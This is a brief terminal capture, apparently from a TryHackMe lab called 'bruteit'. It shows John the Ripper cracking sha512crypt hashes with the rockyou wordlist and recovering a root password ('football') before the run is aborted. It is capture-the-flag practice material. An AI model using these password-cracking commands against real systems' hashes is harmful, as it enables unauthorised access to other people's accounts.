+~/THM/bruteit> john hashes --wordlist=/usr/share/wordlists/rockyou.txt             
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football         (root)     
+1g 0:00:00:06 0.09% (ETA: 19:31:53) 0.1644g/s 2357p/s 4800c/s 4800C/s chanda..dwayne1
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+~/THM/bruteit> 
+
+
